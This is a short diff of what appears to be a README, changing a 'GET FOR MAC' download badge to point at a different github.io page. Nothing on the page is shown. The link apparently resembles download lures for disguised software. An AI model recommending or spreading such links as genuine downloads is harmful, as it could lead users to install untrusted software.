@@ -6,7 +6,7 @@
 <br>
 <div align="center">
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-25.github.io/.github/asgn)
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-stack.github.io/.github/asgn)
 
 </div>
 
